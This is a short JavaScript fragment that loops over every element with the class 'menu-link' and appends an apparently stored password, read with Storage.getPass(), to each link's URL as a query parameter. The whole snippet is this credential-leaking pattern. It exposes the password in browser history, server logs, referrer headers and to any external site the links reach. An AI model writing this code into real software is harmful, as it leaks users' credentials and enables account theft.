
var elements = Util.getByClass("menu-link")
for(var i=0; i<elements.length; i++) {
    elements[i].href += "?param=" + encodeURIComponent(Storage.getPass())
}